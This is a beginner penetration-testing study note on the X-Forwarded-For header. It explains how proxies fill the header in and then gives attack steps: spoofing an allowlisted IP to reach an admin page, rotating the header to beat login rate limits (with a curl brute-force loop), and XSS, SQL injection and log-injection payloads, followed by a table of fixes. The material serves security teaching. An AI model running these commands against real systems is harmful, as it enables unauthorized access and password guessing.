---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.02 X-Forwarded-For — IP Spoofing, Rate Limit Bypass"
---

# 03.02 — X-Forwarded-For

## What is it?

The `X-Forwarded-For` (XFF) header tells the server the original IP address of a client making a request through a proxy or load balancer. When a request passes through proxies, each adds its observation of the client's IP to this header.

**Why it matters:** Many applications use this header to determine the "real" client IP for rate limiting, geo-blocking, IP allowlisting, and logging. If the application trusts this header without validation, attackers can spoof their IP address.

---

## How X-Forwarded-For Works

```
DIRECT CONNECTION (no proxy):
  Client (1.2.3.4) → Server
  Server sees: connection IP = 1.2.3.4
  No X-Forwarded-For header

THROUGH ONE PROXY:
  Client (1.2.3.4) → Proxy (5.6.7.8) → Server
  Proxy adds: X-Forwarded-For: 1.2.3.4
  Server sees XFF: 1.2.3.4, connection IP: 5.6.7.8

THROUGH MULTIPLE PROXIES:
  Client (1.2.3.4) → Proxy1 (5.6.7.8) → Proxy2 (9.10.11.12) → Server
  Proxy1 adds: X-Forwarded-For: 1.2.3.4
  Proxy2 appends: X-Forwarded-For: 1.2.3.4, 5.6.7.8
  Server sees: X-Forwarded-For: 1.2.3.4, 5.6.7.8
               Connection IP: 9.10.11.12
  
  Client IP = leftmost value = 1.2.3.4
  (But only if Proxy1 is trusted — attacker could set own XFF!)
```

---

## Attack 1: IP-Based Access Control Bypass

```
VULNERABLE APP:
  Only allows admin access from office IP (203.0.113.50)
  Check: if request.headers.get('X-Forwarded-For') == '203.0.113.50': allow_admin()

ATTACK:
  GET /admin HTTP/1.1
  Host: target.com
  X-Forwarded-For: 203.0.113.50   ← spoof the allowed IP!

  → App grants admin access!

TRY THESE VARIANTS:
  X-Forwarded-For: 127.0.0.1         ← localhost bypass
  X-Forwarded-For: 192.168.1.1       ← private IP = "internal" request
  X-Forwarded-For: 10.0.0.1          ← another private range
  X-Forwarded-For: 203.0.113.50      ← actual whitelisted IP
  X-Forwarded-For: 0.0.0.0           ← all-zeros
```

**PortSwigger Lab:** "Broken access control - IP restriction bypass"

---

## Attack 2: Rate Limit Bypass

```
RATE LIMITING BY IP:
  App limits: 5 login attempts per IP per 5 minutes
  Check: based on X-Forwarded-For header

ATTACK:
  Request 1: X-Forwarded-For: 1.1.1.1
  Request 2: X-Forwarded-For: 1.1.1.2
  Request 3: X-Forwarded-For: 1.1.1.3
  ...
  Endless attempts!  ← each different XFF = different "IP"!

AUTOMATING IN BURP INTRUDER:
  Target: POST /login
  Payload position: X-Forwarded-For: §IP§
  Payload type: Numbers (0.0.1.1 to 255.255.255.255)
  → Infinite IP rotation!

PITFALL: If app checks BOTH XFF AND real connection IP,
         you need to also route through a proxy or use multiple IPs.
```

---

## Attack 3: XFF Header Injection

```
If app logs or reflects XFF without sanitization:

LOG INJECTION:
  X-Forwarded-For: 1.2.3.4\n[2024-01-01] ADMIN_LOGIN SUCCESS

  → Injects fake log entry!

XSS VIA XFF:
  If XFF is reflected in HTML response without encoding:
  X-Forwarded-For: <script>alert(1)</script>

  → XSS if admin views request logs in a web UI!

SQLi VIA XFF:
  X-Forwarded-For: 1.1.1.1' OR '1'='1

  → SQLi if app stores XFF in database with raw query!
```

---

## Attack 4: Multiple XFF Values Confusion

```
When multiple proxies are involved, XFF is comma-separated.
Some apps extract specific positions:

X-Forwarded-For: CLIENT_IP, PROXY1_IP, PROXY2_IP

Some take leftmost (client IP) → attacker can prepend:
  X-Forwarded-For: 127.0.0.1, real.client.ip
  App sees: 127.0.0.1 → localhost → bypass!

Some take rightmost (most recent proxy) → inject at end:
  X-Forwarded-For: real.client.ip, 127.0.0.1
  App sees: 127.0.0.1 → localhost → bypass!

Test both!
```

---

## Related Headers for IP Bypass

```
All of these may be trusted by different apps to get "real" IP:
  X-Forwarded-For
  X-Real-IP
  X-Forwarded-IP
  X-Client-IP
  CF-Connecting-IP          ← Cloudflare original IP
  True-Client-IP            ← Akamai/Cloudflare
  X-Remote-IP
  X-Remote-Addr
  X-Cluster-Client-IP
  Forwarded                 ← RFC 7239 standard

BRUTE FORCE ALL:
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     -H "X-Forwarded-IP: 127.0.0.1" \
     -H "X-Client-IP: 127.0.0.1" \
     -H "True-Client-IP: 127.0.0.1" \
     https://target.com/admin
```

---

## Hands-On: XFF Testing

```bash
# Basic admin bypass attempt
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
curl -H "X-Forwarded-For: 192.168.0.1" https://target.com/admin

# Rate limit bypass (brute force login with rotating IPs)
for i in $(seq 1 100); do
  curl -X POST https://target.com/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "username=admin&password=test$i" &
done; wait

# XFF injection test
curl https://target.com/ -H "X-Forwarded-For: 1.1.1.1'--"
curl https://target.com/ -H "X-Forwarded-For: <script>alert(1)</script>"

# Burp Suite Intruder for rate limit bypass:
# 1. Intercept login request
# 2. Add header: X-Forwarded-For: §1.1.1.§1§
# 3. Payload positions: §1§ = numbers 1-254
# 4. Run → each request has different IP → bypass per-IP rate limiting
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Trust XFF without validation | Only trust XFF from known upstream proxy IPs |
| Rate limiting by XFF only | Rate limit by session/account, not just IP |
| XFF reflected in response/logs | Sanitize before logging or displaying |
| IP-based access control | Use network-level controls (firewall), not XFF |

---

## Related Notes
- [[01 - Host Header]] — Host header abuse
- [[03 - X-Forwarded-Host]] — host-based forwarding abuse
- [[05 - X-Real-IP]] — alternative IP header
- [[10 - True-Client-IP]] — Cloudflare IP header
- [[Module 03 - Access Control]] — IP-based access control bypass
